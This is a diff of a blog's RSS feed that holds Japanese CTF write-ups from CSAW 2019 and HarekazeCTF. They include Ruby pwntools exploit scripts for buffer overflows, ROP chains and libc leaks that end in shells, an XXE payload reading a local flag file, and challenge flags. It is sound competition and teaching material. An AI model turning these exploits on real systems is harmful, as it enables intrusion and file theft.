@@ -1,3 +1,4 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
 
 
 
@@ -10,7 +11,7 @@
       <html lang="en-us">
         <head>
           <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-          <title>writeup RSS | $ make life</title>
+          <title>Writeup RSS | $ make life</title>
           <link rel="stylesheet" href="https://owlinux1000.github.io/blog/css/base.min.21688b64210142c045c9a1d930a48fc517f428060c78a3a012d71f971874c5c3.css" integrity="sha256-IWiLZCEBQsBFyaHZMKSPxRf0KAYMeKOgEtcflxh0xcM=" />
         </head>
         <body>
@@ -49,7 +50,7 @@
               <div class="u-padding">
                 <h2 class="Heading-title">
                   
-                  <a class="Heading-link u-clickable" href="https://owlinux1000.github.io/blog/categories/writeup/index.xml" rel="bookmark">writeup RSS</a>
+                  <a class="Heading-link u-clickable" href="https://owlinux1000.github.io/blog/categories/writeup/index.xml" rel="bookmark">Writeup RSS</a>
                   
                 </h2>
                 
@@ -74,9 +75,9 @@
     </xsl:template>
   </xsl:stylesheet>
   <channel>
-    <title>writeup on $ make life</title>
+    <title>Writeup on $ make life</title>
     <link>https://owlinux1000.github.io/blog/categories/writeup/</link>
-    <description>Recent content in writeup on $ make life</description>
+    <description>Recent content in Writeup on $ make life</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <lastBuildDate>Thu, 19 Sep 2019 23:49:38 +0900</lastBuildDate>
@@ -249,12 +250,12 @@ text_base &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; tmp&lt;span styl
 stack_addr &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; tmp&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;match(&lt;span style=&#34;color:#b68&#34;&gt;/at: (.*)\./&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;].&lt;/span&gt;to_i(&lt;span style=&#34;color:#666&#34;&gt;16&lt;/span&gt;)
 pop_ecx_ret &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; text_base &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0x0040178c&lt;/span&gt;
 jmp_memory &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; text_base &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0x0040110d&lt;/span&gt;
-&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;image base address        : 0x%x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;%&lt;/span&gt; text_base
-&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Stack address             : 0x%x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;%&lt;/span&gt; stack_addr
-&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;pop ecx; ret              @ 0x%x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;%&lt;/span&gt; pop_ecx_ret
-&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;jmp dword[0x401160+ecx*4] @ 0x%x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;%&lt;/span&gt; jmp_memory
-
-&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;[*] Select V to overflow&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;image base address        : 0x%x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;% text_base
+&lt;/span&gt;&lt;span style=&#34;color:#008000&#34;&gt;puts &lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Stack address             : 0x%x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;% stack_addr
+&lt;/span&gt;&lt;span style=&#34;color:#008000&#34;&gt;puts &lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;pop ecx; ret              @ 0x%x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;% pop_ecx_ret
+&lt;/span&gt;&lt;span style=&#34;color:#008000&#34;&gt;puts &lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;jmp dword[0x401160+ecx*4] @ 0x%x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;% jmp_memory
+&lt;/span&gt;&lt;span style=&#34;color:#008000&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#008000&#34;&gt;puts &lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;[*] Select V to overflow&amp;#34;&lt;/span&gt;
 z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;V&amp;#34;&lt;/span&gt;
 z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;).&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\n\n&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;
 
@@ -317,8 +318,8 @@ libc &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;c
 z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;)
 libc_printf &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;match(&lt;span style=&#34;color:#b68&#34;&gt;/: (.+)/&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;].&lt;/span&gt;to_i(&lt;span style=&#34;color:#666&#34;&gt;16&lt;/span&gt;)
 libc_base &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; libc_printf &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; libc&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;symbols&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;printf&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;
-&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;%x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;%&lt;/span&gt; libc_base
-payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;40&lt;/span&gt;
+&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;%x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;% libc_base
+&lt;/span&gt;&lt;span style=&#34;color:#008000&#34;&gt;payload &lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;40&lt;/span&gt;
 payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(libc_base &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0x4f322&lt;/span&gt;)
 z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline(payload)
 z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;interact&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
@@ -451,7 +452,8 @@ change(&lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;
 &lt;h3 id=&#34;beleaf&#34;&gt;Beleaf&lt;/h3&gt;
 
 &lt;ul&gt;
-&lt;li&gt;&lt;p&gt;バイナリ中にFLAGに使われる文字列とインデックスの配列があるので、それを引っこ抜いてきて実行する&lt;/p&gt;
+&lt;li&gt;バイナリ中にFLAGに使われる文字列とインデックスの配列があるので、それを引っこ抜いてきて実行する&lt;/li&gt;
+&lt;/ul&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;
 
 idxs &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;0x1&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x9&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x11&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x27&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x02&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x03&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x8&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x9&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x11&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x1&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x3&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x13&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x4&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x3&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x5&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x15&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x2e&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0xa&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x3&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0xa&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x3&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x1&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x2e&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x16&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x2e&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0xa&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x6&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;
@@ -459,10 +461,10 @@ idxs &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;c
 flag &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;0x77&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x66&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x7b&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x5f&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x6e&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x79&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x7d&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x62&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x6c&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x72&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x61&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x65&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x69&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x6f&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x74&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x67&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x75&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;].&lt;/span&gt;map(&lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#19177c&#34;&gt;:chr&lt;/span&gt;)
 
 idxs&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;each &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;do&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;|&lt;/span&gt;i&lt;span style=&#34;color:#666&#34;&gt;|&lt;/span&gt;
-&lt;span style=&#34;color:#008000&#34;&gt;print&lt;/span&gt; flag&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;i&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;
-&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;&lt;strong&gt;flag{we_beleaf_in_your_re_future}&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;
+  &lt;span style=&#34;color:#008000&#34;&gt;print&lt;/span&gt; flag&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;i&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;
+&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;flag{we_beleaf_in_your_re_future}&lt;/strong&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;h2 id=&#34;web&#34;&gt;Web&lt;/h2&gt;
@@ -499,24 +501,24 @@ idxs&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;each &lt;span style=&#3
 &lt;ul&gt;
 &lt;li&gt;試してたが、普通にXXEとしてうまくないファイルだったためこの方針を諦めてしまっていたのが解けない原因っぽい&lt;/li&gt;
 &lt;/ul&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;&lt;code&gt;cat x.xml | iconv -f UTF-8 -t UTF-16BE &amp;gt; x_utf-16.xml&lt;/code&gt; などで作成してアップロードする&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;color:#bc7a00&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt;&lt;/span&gt;
-&lt;span style=&#34;color:#bc7a00&#34;&gt;&amp;lt;!DOCTYPE root[
-&lt;/span&gt;&lt;span style=&#34;color:#bc7a00&#34;&gt;&amp;lt;!ENTITY pass SYSTEM &amp;#34;file:///flag.txt&amp;#34;&amp;gt;&lt;/span&gt;
+&lt;li&gt;&lt;code&gt;cat x.xml | iconv -f UTF-8 -t UTF-16BE &amp;gt; x_utf-16.xml&lt;/code&gt; などで作成してアップロードする
+&lt;code&gt;xml
+&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;
+&amp;lt;!DOCTYPE root[
+&amp;lt;!ENTITY pass SYSTEM &amp;quot;file:///flag.txt&amp;quot;&amp;gt;
 ]&amp;gt;
-&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;&amp;lt;users&amp;gt;&lt;/span&gt;
-&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;&amp;lt;user&amp;gt;&lt;/span&gt;
-&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;&amp;lt;username&amp;gt;&lt;/span&gt;alice2&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;&amp;lt;/username&amp;gt;&lt;/span&gt;
-&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;&amp;lt;password&amp;gt;&lt;/span&gt;passwd1&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;&amp;lt;/password&amp;gt;&lt;/span&gt;
-&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;&amp;lt;name&amp;gt;&lt;/span&gt;Alice2&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;&amp;lt;/name&amp;gt;&lt;/span&gt;
-&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;&amp;lt;email&amp;gt;&lt;/span&gt;alice2@fakesite.com&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;&amp;lt;/email&amp;gt;&lt;/span&gt;
-&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;&amp;lt;group&amp;gt;&lt;/span&gt;CSAW2019&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;&amp;lt;/group&amp;gt;&lt;/span&gt;
-&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;&amp;lt;intro&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#999;font-weight:bold&#34;&gt;&amp;amp;pass;&lt;/span&gt;&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;&amp;lt;/intro&amp;gt;&lt;/span&gt;
-&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;&amp;lt;/user&amp;gt;&lt;/span&gt;
-&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;&amp;lt;/users&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;&lt;strong&gt;flag{n0w_i&amp;rsquo;m_s@d_cuz_y0u_g3t_th3_fl4g_but_c0ngr4ts}&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;
+&amp;lt;users&amp;gt;
+&amp;lt;user&amp;gt;
+&amp;lt;username&amp;gt;alice2&amp;lt;/username&amp;gt;
+&amp;lt;password&amp;gt;passwd1&amp;lt;/password&amp;gt;
+&amp;lt;name&amp;gt;Alice2&amp;lt;/name&amp;gt;
+&amp;lt;email&amp;gt;alice2@fakesite.com&amp;lt;/email&amp;gt;
+&amp;lt;group&amp;gt;CSAW2019&amp;lt;/group&amp;gt;
+&amp;lt;intro&amp;gt;&amp;amp;pass;&amp;lt;/intro&amp;gt;
+&amp;lt;/user&amp;gt;
+&amp;lt;/users&amp;gt;
+&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;flag{n0w_i&amp;rsquo;m_s@d_cuz_y0u_g3t_th3_fl4g_but_c0ngr4ts}&lt;/strong&gt;&lt;/li&gt;
 &lt;/ul&gt;
 </description>
     </item>
@@ -530,7 +532,8 @@ idxs&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;each &lt;span style=&#3
 &lt;h2 id=&#34;baby-rop-1&#34;&gt;Baby ROP 1&lt;/h2&gt;
 
 &lt;ul&gt;
-&lt;li&gt;&lt;p&gt;バイナリ中で、&lt;code&gt;system&lt;/code&gt; 関数使ってechoしており、Canary等もないBOFが起こるので、&lt;code&gt;pop rdi; ret&lt;/code&gt; 使って&lt;code&gt;system(/bin/sh)&lt;/code&gt; を呼ぶだけ&lt;/p&gt;
+&lt;li&gt;バイナリ中で、&lt;code&gt;system&lt;/code&gt; 関数使ってechoしており、Canary等もないBOFが起こるので、&lt;code&gt;pop rdi; ret&lt;/code&gt; 使って&lt;code&gt;system(/bin/sh)&lt;/code&gt; を呼ぶだけ&lt;/li&gt;
+&lt;/ul&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;
 
 &lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;
@@ -550,15 +553,16 @@ payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt
 
 z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload
 
-z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;interact&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;&lt;strong&gt;HarekazeCTF{r3turn_0r13nt3d_pr0gr4mm1ng_i5_3ss3nt141_70_pwn}&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;interact&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;HarekazeCTF{r3turn_0r13nt3d_pr0gr4mm1ng_i5_3ss3nt141_70_pwn}&lt;/strong&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;h2 id=&#34;baby-rop-2&#34;&gt;Baby ROP 2&lt;/h2&gt;
 
 &lt;ul&gt;
-&lt;li&gt;&lt;p&gt;&lt;code&gt;system&lt;/code&gt; 関数などは、存在しないが、libc が配布されているので、ROPでlibcアドレスリークして、One-Gagdet に飛ばすだけ&lt;/p&gt;
+&lt;li&gt;&lt;code&gt;system&lt;/code&gt; 関数などは、存在しないが、libc が配布されているので、ROPでlibcアドレスリークして、One-Gagdet に飛ばすだけ&lt;/li&gt;
+&lt;/ul&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;
 
 &lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;
@@ -586,16 +590,16 @@ data &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; z&lt;span style=&#34;
 &lt;span style=&#34;color:#008000&#34;&gt;p&lt;/span&gt; data
 libc_base &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; u64(data&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;recvlen, &lt;span style=&#34;color:#666&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;].&lt;/span&gt;ljust(&lt;span style=&#34;color:#666&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;)) &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; libc&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;symbols&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;__libc_start_main&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;
 libc_magic &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; libc_base &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0xf02a4&lt;/span&gt;
-&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;libc base 0x%x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;%&lt;/span&gt; libc_base
-&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;libc magic 0x%x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;%&lt;/span&gt; libc_magic
-
-payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;B&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;40&lt;/span&gt;
+&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;libc base 0x%x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;% libc_base
+&lt;/span&gt;&lt;span style=&#34;color:#008000&#34;&gt;puts &lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;libc magic 0x%x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;% libc_magic
+&lt;/span&gt;&lt;span style=&#34;color:#008000&#34;&gt;
